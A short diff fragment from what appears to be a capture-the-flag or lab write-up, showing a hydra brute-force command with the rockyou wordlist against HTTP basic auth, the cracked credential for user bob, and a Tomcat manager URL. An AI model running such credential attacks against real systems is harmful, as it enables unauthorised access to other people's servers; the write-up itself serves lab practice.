@@ -42,3 +42,10 @@ Hey <b>bob</b>, did you update that TomCat server?
 hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.129.187.90 -s 80 http-get /protected/
 
 ```
+```
+[80][http-get] host: 10.128.150.41   login: bob   password: bubbles
+```
+```
+http://10.128.150.41:1234/manager/html
+```
+
